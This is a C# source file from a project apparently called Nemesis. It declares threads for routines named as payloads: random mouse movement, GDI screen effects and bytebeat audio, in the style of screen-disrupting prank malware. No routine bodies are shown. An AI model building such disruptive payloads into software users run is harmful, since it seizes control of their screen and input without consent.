using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;

namespace Nemesis
{
    public class ThreadTasks
    {
        public static Thread thMouseMove = new Thread(PayloadsSystem.MoveMouseRandom);

        public static Thread thSpecial1 = new Thread(EffectsGdiSpeciais.DesForm);
        public static Thread thSpecial2 = new Thread(EffectsGdiSpeciais.DesPart);
        public static Thread thSpecial3 = new Thread(EffectsGdiSpeciais.LinesEff);

        public static Thread thSpecialMouse1 = new Thread(MouseGdis.QuadradoGiroRgb);
        public static Thread thSpecialMouse2 = new Thread(MouseGdis.DesForm);
        public static Thread thSpecialMouse3 = new Thread(MouseGdis.MovingIconSnakeEffect);

        public static Thread th1 = new Thread(PayloadsGdi.Gdi1);
        public static Thread th2 = new Thread(PayloadsGdi.Gdi2);
        public static Thread th3 = new Thread(PayloadsGdi.Gdi3);
        public static Thread th4 = new Thread(PayloadsGdi.Gdi4);
        public static Thread th5 = new Thread(PayloadsGdi.Gdi5);
        public static Thread th6 = new Thread(PayloadsGdi.Gdi6);
        public static Thread th7 = new Thread(PayloadsGdi.Gdi7);

        public static Thread b1 = new Thread(Bytebeats.Beat1);
        public static Thread b2 = new Thread(Bytebeats.Beat2);
        public static Thread b3 = new Thread(Bytebeats.Beat3);
        public static Thread b4 = new Thread(Bytebeats.Beat4);
        public static Thread b5 = new Thread(Bytebeats.Beat5);
        public static Thread b6 = new Thread(Bytebeats.Beat6);
        public static Thread b7 = new Thread(Bytebeats.Beat7);
    }
}
